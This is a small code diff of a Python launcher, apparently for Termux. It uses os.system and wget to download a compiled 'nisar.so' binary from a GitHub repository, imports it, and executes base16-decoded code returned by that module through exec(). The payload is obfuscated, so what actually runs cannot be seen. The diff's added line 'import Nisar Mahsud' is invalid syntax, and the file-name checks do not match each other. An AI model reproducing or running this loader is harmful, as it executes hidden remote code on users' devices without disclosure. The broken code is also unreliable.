@@ -9,8 +9,8 @@ bit=platform.architecture()[0]
 if not os.path.isfile('nisar.so'):
 	os.system('wget https://raw.githubusercontent.com/Nisar-Mahsud/Binaries/main/bxi/for-termux/{}/nisar.so'.format(bit))
 	time.sleep(1)
-	import Nisar
-	exec(base64.b16decode(binni.bcoder909()))
+	import Nisar Mahsud 
+	exec(base64.b16decode(Nisar.bcoder909()))
 elif os.path.isfile('Nisar.so'):
 	import Nisar
 	exec(base64.b16decode(Nisar.bcoder909()))
